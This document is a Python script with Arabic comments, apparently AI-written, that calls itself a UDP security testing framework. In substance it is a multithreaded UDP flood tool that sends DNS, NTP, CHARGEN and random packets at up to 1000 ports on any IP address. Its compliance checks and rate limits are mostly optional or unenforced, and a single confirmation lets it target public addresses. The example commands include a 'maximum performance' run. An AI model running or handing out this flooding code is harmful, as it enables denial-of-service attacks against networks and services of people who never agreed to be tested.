#!/usr/bin/env python3
# ===========================================================
# 🚀 UDP SECURITY TESTING FRAMEWORK - AI OPTIMIZED
# 🔒 للأغراض الأمنية المشروعة والاختبار المسؤول فقط
# Author: AI Security Assistant
# ===========================================================

import argparse
import random
import socket
import threading
import time
import sys
import struct
import ipaddress
import os
import functools
import logging
import json
import csv
import hashlib
import getpass
from typing import List, Tuple, Dict, Any
from datetime import datetime, timedelta

# ==================== إعدادات UDP المحسنة ====================

class UDPConfig:
    """إعدادات أداء UDP المثلى مع التحسينات الجديدة"""
    
    # إعدادات Socket
    SOCKET_BUFFER_SIZE = 65535
    SOCKET_TIMEOUT = 0.1
    REUSE_ADDRESS = True
    NON_BLOCKING = True
    
    # إعدادات الحزم
    MIN_PACKET_SIZE = 512
    MAX_PACKET_SIZE = 1400
    OPTIMAL_PACKET_SIZE = 1024
    
    # إعدادات الأداء المحسنة
    MAX_THREADS = 1000
    PACKETS_PER_BATCH = 100
    USE_RAW_SOCKET = False
    
    # أنواع الحزم
    PACKET_TYPES = ['RANDOM', 'DNS', 'NTP', 'CHARGEN', 'PATTERN', 'CUSTOM']
    
    # قيود الأمان
    MAX_PACKETS_PER_SECOND = 10000
    MAX_TEST_DURATION = 300  # 5 دقائق
    COOLING_PERIOD = 60  # 60 ثانية بين الاختبارات
    
    @staticmethod
    def optimize_system():
        """تحسين إعدادات النظام للأداء العالي"""
        try:
            import resource
            soft, hard = resource.getrlimit(resource.RLIMIT_NOFILE)
            new_limit = min(999999, hard)
            resource.setrlimit(resource.RLIMIT_NOFILE, (new_limit, hard))
            print(f"[*] حدود الملفات: {soft} -> {new_limit}")
        except:
            pass

# ==================== نظام الامتثال القانوني ====================

class LegalCompliance:
    """نظام التحقق من الشرعية والامتثال"""
    
    # قائمة الأهداف المسموح بها
    AUTHORIZED_TARGETS = ['127.0.0.1', 'localhost']
    
    # أوقات الاختبار المسموح بها
    ALLOWED_TESTING_HOURS = {
        'weekdays': {'start': 22, 'end': 6},
        'weekends': {'start': 20, 'end': 8}
    }
    
    def __init__(self):
        self.audit_log = "udp_test_audit.csv"
        self._init_audit_log()
    
    def _init_audit_log(self):
        """تهيئة سجل التدقيق"""
        if not os.path.exists(self.audit_log):
            with open(self.audit_log, 'w', newline='', encoding='utf-8') as f:
                writer = csv.writer(f)
                writer.writerow([
                    'timestamp', 'tester', 'target_ip', 'target_port',
                    'duration', 'packets_sent', 'reason', 
                    'authorization_code', 'status'
                ])
    
    def validate_test(self, target_ip: str, target_port: int, 
                     duration: int, reason: str) -> Dict[str, Any]:
        """التحقق من صحة وشرعية الاختبار"""
        
        result = {
            'allowed': False,
            'reasons': [],
            'authorization_code': None,
            'test_window': None
        }
        
        # 1. التحقق من الهدف
        ip_check = self._validate_ip(target_ip)
        if not ip_check['valid']:
            result['reasons'].extend(ip_check['errors'])
            return result
        
        # 2. التحقق من الوقت
        time_check = self._validate_time()
        if not time_check['allowed']:
            result['warnings'] = time_check['warnings']
            result['test_window'] = time_check.get('next_window')
        
        # 3. الموافقة النهائية
        print(f"\n{'='*60}")
        print("🔐 طلب التفويض النهائي")
        print(f"{'='*60}")
        print(f"🎯 الهدف: {target_ip}:{target_port}")
        print(f"⏱️  المدة: {duration} ثانية" if duration else "⏱️  المدة: مستمر")
        print(f"📝 السبب: {reason}")
        print(f"\nبالمتابعة، تؤكد أن:")
        print("1. أنت تملك هذا النظام أو لديك إذن كتابي")
        print("2. أنت تقبل المسؤولية القانونية الكاملة")
        print("3. هذا من أجل تحسين الأمان فقط")
        print("4. ستتوقف فوراً إذا حدثت أي مشاكل")
        print(f"{'='*60}")
        
        response = input("\nاكتب 'موافق' للمتابعة، أي شيء آخر للإلغاء: ")
        
        if response.strip().lower() != 'موافق':
            result['reasons'].append("تم إلغاء الاختبار من قبل المستخدم")
            return result
        
        # 4. تسجيل الاختبار
        auth_code = self._log_test_request(target_ip, target_port, duration, reason)
        
        result.update({
            'allowed': True,
            'authorization_code': auth_code,
            'conditions': [
                "يجب إيقاف الاختبار فوراً إذا اكتشفت مشاكل",
                "يجب استخدام النتائج فقط لتحسين الأمان",
                "جميع الأنشطة مسجلة للامتثال"
            ]
        })
        
        return result
    
    def _validate_ip(self, target_ip: str) -> Dict[str, Any]:
        """التحقق من عنوان IP"""
        result = {'valid': False, 'errors': []}
        
        try:
            ip_obj = ipaddress.ip_address(target_ip)
            
            # التحقق من العناوين المحجوزة
            if ip_obj.is_reserved or ip_obj.is_multicast:
                result['errors'].append("عنوان IP محجوز أو متعدد الإرسال")
                return result
            
            # التحقق من العناوين العامة
            if ip_obj.is_global and target_ip not in self.AUTHORIZED_TARGETS:
                print(f"\n[⚠️] تحذير حاسم: استهداف عنوان عام {target_ip}")
                print("   قد يكون هذا غير قانوني بدون إذن كتابي صريح!")
                response = input("   هل أنت متأكد تماماً؟ (نعم/لا): ").lower()
                if response not in ['نعم', 'yes', 'y']:
                    result['errors'].append("رفض المستخدم اختبار العنوان العام")
                    return result
            
            result['valid'] = True
            return result
            
        except ValueError:
            result['errors'].append("تنسيق عنوان IP غير صالح")
            return result
    
    def _validate_time(self) -> Dict[str, Any]:
        """التحقق من وقت الاختبار"""
        now = datetime.now()
        current_hour = now.hour
        is_weekend = now.weekday() >= 5
        
        if is_weekend:
            allowed = self.ALLOWED_TESTING_HOURS['weekends']
        else:
            allowed = self.ALLOWED_TESTING_HOURS['weekdays']
        
        # التحقق إذا كان الوقت ضمن النطاق المسموح
        if allowed['start'] <= current_hour < allowed['end']:
            return {'allowed': True}
        
        # حساب الوقت التالي المسموح
        if current_hour < allowed['start']:
            next_time = now.replace(hour=allowed['start'], minute=0, second=0)
        else:
            next_time = (now + timedelta(days=1)).replace(
                hour=allowed['start'], minute=0, second=0
            )
        
        return {
            'allowed': False,
            'warnings': [f"الوقت الحالي {current_hour}:00 خارج ساعات الاختبار المسموحة"],
            'next_window': next_time.strftime('%Y-%m-%d %H:%M')
        }
    
    def _log_test_request(self, target_ip: str, target_port: int,
                         duration: int, reason: str) -> str:
        """تسجيل طلب الاختبار"""
        timestamp = datetime.now().isoformat()
        tester = getpass.getuser()
        auth_code = hashlib.sha256(
            f"{timestamp}{target_ip}{tester}".encode()
        ).hexdigest()[:12].upper()
        
        with open(self.audit_log, 'a', newline='', encoding='utf-8') as f:
            writer = csv.writer(f)
            writer.writerow([
                timestamp, tester, target_ip, target_port,
                duration, 0, reason, auth_code, 'معلّق'
            ])
        
        return auth_code
    
    def log_completion(self, auth_code: str, packets_sent: int, status: str):
        """تسجيل اكتمال الاختبار"""
        print(f"[سجل] الاختبار {auth_code} {status}. الحزم: {packets_sent}")

# ==================== مولد الحزم المحسن ====================

class UDPPacketGenerator:
    """مولد حزم UDP متقدمة مع تحسينات"""
    
    def __init__(self):
        self.packet_cache = {}
        self.custom_payload = None
    
    @functools.lru_cache(maxsize=100)
    def get_cached_packet(self, packet_type: str, size: int) -> bytes:
        """الحصول على حزمة مخبأة"""
        cache_key = f"{packet_type}_{size}"
        
        if cache_key in self.packet_cache:
            return self.packet_cache[cache_key]
        
        # توليد حزمة جديدة
        packet = self.generate_smart_packet(packet_type, size)
        
        # التخزين المؤقت للحزم الصغيرة
        if size <= 1500:
            self.packet_cache[cache_key] = packet
        
        return packet
    
    def generate_dns_packet(self) -> bytes:
        """إنشاء حزمة DNS مقلدة"""
        transaction_id = random.randint(0, 65535)
        flags = 0x0100
        questions = 1
        
        packet = struct.pack('!HHHHHH', 
                           transaction_id, flags, 
                           questions, 0, 0, 0)
        
        # اسم النطاق العشوائي
        domains = ['test.com', 'example.org', 'localhost', 'internal.net']
        domain = random.choice(domains)
        
        for part in domain.split('.'):
            packet += struct.pack('B', len(part))
            packet += part.encode()
        packet += b'\x00'
        
        packet += struct.pack('!HH', 1, 1)
        
        return packet
    
    def generate_ntp_packet(self) -> bytes:
        """إنشاء حزمة NTP مقلدة"""
        li_vn_mode = (0 << 6) | (4 << 3) | 3
        stratum = random.randint(1, 3)
        poll = random.randint(4, 10)
        precision = random.randint(0xE0, 0xFF)
        
        packet = struct.pack('!BBBB I I I I I I I I',
                           li_vn_mode, stratum, poll, precision,
                           0, 0, 0, 0, 0, 0, 0, 0)
        
        return packet
    
    def generate_chargen_packet(self) -> bytes:
        """إنشاء حزمة CHARGEN مقلدة"""
        chars = b"!\"#$%&'()*+,-./0123456789:;<=>?@" \
               b"ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`" \
               b"abcdefghijklmnopqrstuvwxyz{|}~"
        
        length = random.randint(100, 1000)
        return (chars * ((length // len(chars)) + 1))[:length]
    
    def generate_pattern_packet(self, size: int) -> bytes:
        """إنشاء حزمة بنمط معين"""
        patterns = [
            b'\x00' * 64,
            b'\xFF' * 64,
            b'\xAA' * 64,
            b'\x55' * 64,
            b'\x00\xFF' * 32,
        ]
        
        pattern = random.choice(patterns)
        repeats = size // len(pattern) + 1
        return (pattern * repeats)[:size]
    
    def generate_smart_packet(self, packet_type: str = 'RANDOM', size: int = None) -> bytes:
        """إنشاء حزمة ذكية بناءً على النوع"""
        if size is None:
            size = UDPConfig.OPTIMAL_PACKET_SIZE
        
        if packet_type == 'DNS':
            packet = self.generate_dns_packet()
        elif packet_type == 'NTP':
            packet = self.generate_ntp_packet()
        elif packet_type == 'CHARGEN':
            packet = self.generate_chargen_packet()
        elif packet_type == 'PATTERN':
            packet = self.generate_pattern_packet(size)
        elif packet_type == 'CUSTOM' and self.custom_payload:
            packet = self.custom_payload[:size]
        else:
            # حزمة عشوائية محسنة
            if size < 100:
                packet = struct.pack('!Q', random.getrandbits(64)) * (size // 8)
                packet += random.randbytes(size % 8)
            else:
                pattern = random.randbytes(64)
                packet = (pattern * ((size // 64) + 1))[:size]
        
        return packet[:size]
    
    def generate_batch(self, packet_type: str, size: int, count: int) -> List[bytes]:
        """توليد دفعة من الحزم"""
        return [self.get_cached_packet(packet_type, size) for _ in range(count)]

# ==================== محرك UDP عالي الأداء ====================

class HighPerfUDPEngine:
    """محرك UDP عالي الأداء مع التحسينات"""
    
    def __init__(self, target_ip: str, target_ports: List[int]):
        self.target_ip = target_ip
        self.target_ports = target_ports
        self.running = False
        self.metrics = {
            'packets_sent': 0,
            'bytes_sent': 0,
            'errors': 0,
            'ports_hit': set(),
            'packet_types': {},
            'start_time': 0
        }
        
        self.packet_generator = UDPPacketGenerator()
        
        # تحسين النظام
        UDPConfig.optimize_system()
    
    def create_optimized_socket(self) -> socket.socket:
        """إنشاء socket محسن للأداء العالي"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            
            # إعدادات الأداء
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 
                          UDPConfig.SOCKET_BUFFER_SIZE)
            
            if UDPConfig.NON_BLOCKING:
                sock.setblocking(0)
            
            if UDPConfig.USE_RAW_SOCKET and hasattr(socket, 'SOCK_RAW'):
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, 
                                       socket.IPPROTO_UDP)
                    print("[*] استخدام وضع raw socket")
                except:
                    pass
            
            return sock
        except Exception as e:
            print(f"[!] خطأ في إنشاء socket: {e}")
            return socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    def attack_worker(self, worker_id: int, packet_type: str, burst_size: int = 50):
        """عامل هجوم UDP عالي الأداء"""
        sockets = [self.create_optimized_socket() for _ in range(3)]
        port_index = worker_id % len(self.target_ports)
        target_port = self.target_ports[port_index]
        
        if worker_id == 0:
            print(f"[العامل {worker_id}] استهداف المنفذ {target_port} بنوع {packet_type}")
        
        while self.running:
            try:
                sock = random.choice(sockets)
                port = self.target_ports[random.randint(0, len(self.target_ports)-1)]
                target = (self.target_ip, port)
                
                # إرسال دفعة
                for _ in range(burst_size):
                    if not self.running:
                        break
                    
                    size = random.randint(UDPConfig.MIN_PACKET_SIZE, UDPConfig.MAX_PACKET_SIZE)
                    packet = self.packet_generator.get_cached_packet(packet_type, size)
                    
                    try:
                        sock.sendto(packet, target)
                        
                        with threading.Lock():
                            self.metrics['packets_sent'] += 1
                            self.metrics['bytes_sent'] += len(packet)
                            self.metrics['ports_hit'].add(port)
                            
                            if packet_type in self.metrics['packet_types']:
                                self.metrics['packet_types'][packet_type] += 1
                            else:
                                self.metrics['packet_types'][packet_type] = 1
                    
                    except (BlockingIOError, socket.error):
                        self.metrics['errors'] += 1
                
                # تحديث التقدم
                if worker_id == 0 and self.metrics['packets_sent'] % 1000 == 0:
                    self.show_progress(worker_id)
                
                # تأخير قصير
                time.sleep(0.001)
                
                # تغيير نوع الحزمة بشكل دوري
                if self.metrics['packets_sent'] % 500 == 0:
                    packet_type = random.choice(UDPConfig.PACKET_TYPES)
                    
            except Exception as e:
                if worker_id == 0:
                    print(f"[العامل {worker_id}] خطأ: {e}")
                time.sleep(0.1)
        
        # تنظيف
        for sock in sockets:
            try:
                sock.close()
            except:
                pass
    
    def show_progress(self, worker_id: int = 0):
        """عرض تقدم الهجوم"""
        elapsed = time.time() - self.metrics['start_time']
        if elapsed > 0:
            pps = self.metrics['packets_sent'] / elapsed
            mbps = (self.metrics['bytes_sent'] * 8) / (elapsed * 1000000)
            
            print(f"\r[إحصائيات] الحزم: {self.metrics['packets_sent']:,} | "
                  f"السرعة: {pps:,.0f} حزمة/ث | {mbps:.2f} ميغابت/ث | "
                  f"المنافذ: {len(self.metrics['ports_hit'])} | "
                  f"العمال: {threading.active_count()-1}", end="")
            sys.stdout.flush()
    
    def start_attack(self, threads: int, packet_type: str = 'RANDOM',
                    duration: int = None, burst_size: int = 50):
        """بدء هجوم UDP عالي الأداء"""
        self.running = True
        self.metrics['start_time'] = time.time()
        
        print(f"\n{'='*60}")
        print(f"🚀 اختبار UDP عالي الأداء")
        print(f"🎯 الهدف: {self.target_ip}")
        print(f"📌 المنافذ: {len(self.target_ports)} منفذ")
        print(f"🧵 الخيوط: {threads}")
        print(f"📦 نوع الحزمة: {packet_type}")
        print(f"💥 حجم الدفعة: {burst_size}")
        if duration:
            print(f"⏱️  المدة: {duration} ثانية")
        print(f"{'='*60}\n")
        
        # إنشاء خيوط الهجوم
        thread_pool = []
        for i in range(min(threads, UDPConfig.MAX_THREADS)):
            t = threading.Thread(
                target=self.attack_worker,
                args=(i, packet_type, burst_size),
                daemon=True
            )
            t.start()
            thread_pool.append(t)
        
        # مؤشر التقدم
        progress_thread = threading.Thread(target=self._progress_monitor, daemon=True)
        progress_thread.start()
        
        # التحكم في المدة
        try:
            if duration:
                print(f"[*] سيعمل الاختبار لمدة {duration} ثانية")
                time.sleep(duration)
                self.stop_attack()
            else:
                print("[*] اضغط Ctrl+C لإيقاف الاختبار")
                while self.running:
                    time.sleep(1)
        except KeyboardInterrupt:
            print("\n[*] إيقاف الاختبار...")
            self.stop_attack()
        
        # الانتظار لإنهاء الخيوط
        for t in thread_pool:
            t.join(timeout=1)
        
        # عرض النتائج النهائية
        self.show_final_stats()
    
    def _progress_monitor(self):
        """مراقب التقدم"""
        while self.running:
            self.show_progress()
            time.sleep(0.5)
    
    def stop_attack(self):
        """إيقاف الهجوم"""
        self.running = False
    
    def show_final_stats(self):
        """عرض الإحصائيات النهائية"""
        elapsed = time.time() - self.metrics['start_time']
        
        print(f"\n{'='*60}")
        print("📊 اكتمل الهجوم - الإحصائيات النهائية")
        print(f"{'='*60}")
        print(f"⏱️  المدة: {elapsed:.2f} ثانية")
        print(f"📦 إجمالي الحزم: {self.metrics['packets_sent']:,}")
        print(f"💾 إجمالي البايتات: {self.metrics['bytes_sent']:,} "
              f"({self.metrics['bytes_sent']/1024/1024:.2f} ميجابايت)")
        
        if elapsed > 0:
            print(f"⚡ متوسط السرعة: {self.metrics['packets_sent']/elapsed:,.0f} حزمة/ثانية")
            print(f"📡 عرض النطاق: {(self.metrics['bytes_sent']*8)/(elapsed*1000000):.2f} ميغابت/ثانية")
        
        print(f"🎯 المنافذ المستهدفة: {len(self.metrics['ports_hit'])}")
        print(f"❌ الأخطاء: {self.metrics['errors']}")
        
        # توزيع أنواع الحزم
        if self.metrics['packet_types']:
            print("\n📋 توزيع أنواع الحزم:")
            for ptype, count in self.metrics['packet_types'].items():
                percentage = (count / self.metrics['packets_sent']) * 100
                print(f"  {ptype}: {count:,} حزمة ({percentage:.1f}%)")
        
        print(f"{'='*60}")

# ==================== تقييد المعدل ====================

class RateLimiter:
    """نظام تقييد معدل الإرسال"""
    
    def __init__(self):
        self.limits = {
            'max_pps': UDPConfig.MAX_PACKETS_PER_SECOND,
            'max_duration': UDPConfig.MAX_TEST_DURATION,
            'cooling': UDPConfig.COOLING_PERIOD
        }
        self.last_test = 0
    
    def check(self, planned_packets: int, planned_duration: int) -> Dict[str, Any]:
        """التحقق من حدود المعدل"""
        result = {
            'allowed': True,
            'exceeded': [],
            'suggestions': []
        }
        
        # التحقق من المدة
        if planned_duration > self.limits['max_duration']:
            result['allowed'] = False
            result['exceeded'].append(f"المدة ({planned_duration}ث) تتجاوز الحد ({self.limits['max_duration']}ث)")
            result['suggestions'].append(f"قلل المدة إلى {self.limits['max_duration']} ثانية أو أقل")
        
        # التحقق من وقت التبريد
        time_since_last = time.time() - self.last_test
        if time_since_last < self.limits['cooling']:
            wait_time = self.limits['cooling'] - time_since_last
            result['allowed'] = False
            result['exceeded'].append(f"فترة التبريد نشطة. متبقي {wait_time:.0f} ثانية")
            result['suggestions'].append(f"انتظر {wait_time:.0f} ثانية قبل الاختبار التالي")
        
        return result
    
    def start_test(self):
        """بدء اختبار جديد"""
        self.last_test = time.time()

# ==================== الدالة الرئيسية ====================

def parse_arguments():
    """تحليل وسائط سطر الأوامر"""
    parser = argparse.ArgumentParser(
        description="🚀 إطار اختبار UDP المحسن - للأغراض الأمنية المشروعة فقط",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
⚠️  تحذير قانوني:
هذه الأداة للأغراض الأمنية المشروعة فقط.
الاستخدام غير المصرح به ضد الأنظمة التي لا تملكها أو ليس لديك إذن صريح لاختبارها غير قانوني.

أمثلة:
  # اختبار الخادم المحلي (وضع آمن)
  %(prog)s -i 127.0.0.1 -p 80-100 -t 10 -d 30
  
  # اختبار عالي الأداء بحزم DNS
  %(prog)s -i 192.168.1.100 -p 1-1000 -t 50 --type DNS --burst 100
  
  # اختبار أقصى أداء
  %(prog)s -i 10.0.0.1 -p 0 -t 100 --burst 200 --compliance-check
        """
    )
    
    parser.add_argument("-i", "--ip", required=True, help="عنوان IP الهدف")
    parser.add_argument("-p", "--port", default="80-100", help="نطاق المنافذ (مثال: 80, 1-100, أو 0 لجميع المنافذ)")
    parser.add_argument("-t", "--threads", type=int, default=10, help="عدد خيوط الهجوم (افتراضي: 10)")
    parser.add_argument("-d", "--duration", type=int, help="مدة الهجوم بالثواني (اختياري)")
    parser.add_argument("--type", default="RANDOM", choices=UDPConfig.PACKET_TYPES, help="نوع الحزمة (افتراضي: RANDOM)")
    parser.add_argument("--burst", type=int, default=50, help="الحزم لكل دفعة (افتراضي: 50)")
    parser.add_argument("--compliance-check", action="store_true", help="التحقق من الامتثال قبل البدء")
    parser.add_argument("--raw", action="store_true", help="استخدام raw sockets (يتطلب صلاحيات root)")
    parser.add_argument("--verbose", action="store_true", help="مخرجات مفصلة")
    
    return parser.parse_args()

def parse_port_range(port_str: str) -> List[int]:
    """تحليل نطاق المنافذ"""
    if port_str == "0":
        # جميع المنافذ (محدودة)
        ports = list(range(1, 1001))
        print(f"[*] اختيار أول 1000 منفذ")
    elif "-" in port_str:
        try:
            min_p, max_p = map(int, port_str.split("-"))
            ports = list(range(min_p, max_p + 1))
        except:
            ports = [80, 443]
    else:
        try:
            ports = [int(port_str)]
        except:
            ports = [80]
    
    # تقييد عدد المنافذ
    if len(ports) > 1000:
        print(f"[*] تقييد نطاق المنافذ إلى 1000 منفذ (من أصل {len(ports)})")
        ports = ports[:1000]
    
    return ports

def display_banner():
    """عرض لافتة البرنامج"""
    print("""
    ╔══════════════════════════════════════════════════════════╗
    ║      🚀 إطار اختبار UDP المحسن بالأمان                  ║
    ║      للأغراض الأمنية المشروعة فقط                        ║
    ║      ⚠️  استخدم بمسؤولية وقانونية ⚠️                   ║
    ╚══════════════════════════════════════════════════════════╝
    """)

def main():
    """الدالة الرئيسية"""
    display_banner()
    
    args = parse_arguments()
    
    # التحقق من الامتثال
    if args.compliance_check:
        compliance = LegalCompliance()
        validation = compliance.validate_test(
            target_ip=args.ip,
            target_port=80,
            duration=args.duration or 0,
            reason="اختبار أمني"
        )
        
        if not validation['allowed']:
            print("\n[!] الاختبار غير مصرح به:")
            for reason in validation['reasons']:
                print(f"  • {reason}")
            sys.exit(1)
        
        print(f"\n[✅] الاختبار مصرح به. رمز التفويض: {validation['authorization_code']}")
    
    # تحليل المنافذ
    target_ports = parse_port_range(args.port)
    
    # التحقق من حدود المعدل
    rate_limiter = RateLimiter()
    rate_check = rate_limiter.check(
        planned_packets=args.threads * args.burst * 100,
        planned_duration=args.duration or UDPConfig.MAX_TEST_DURATION
    )
    
    if not rate_check['allowed']:
        print("\n[!] الاختبار يتجاوز الحدود:")
        for limit in rate_check['exceeded']:
            print(f"  • {limit}")
        
        if rate_check['suggestions']:
            print("\n[!] اقتراحات:")
            for suggestion in rate_check['suggestions']:
                print(f"  • {suggestion}")
        
        sys.exit(1)
    
    # إعدادات Raw Socket
    if args.raw:
        UDPConfig.USE_RAW_SOCKET = True
        if os.name == 'posix' and os.geteuid() != 0:
            print("[!] وضع raw socket يتطلب صلاحيات root!")
            sys.exit(1)
    
    # إنشاء محرك الهجوم
    engine = HighPerfUDPEngine(args.ip, target_ports)
    
    # بدء الهجوم
    try:
        engine.start_attack(
            threads=args.threads,
            packet_type=args.type,
            duration=args.duration,
            burst_size=args.burst
        )
    except KeyboardInterrupt:
        print("\n\n[*] توقف الاختبار من قبل المستخدم")
    except Exception as e:
        print(f"[!] خطأ: {e}")
        import traceback
        traceback.print_exc()

if __name__ == "__main__":
    main()
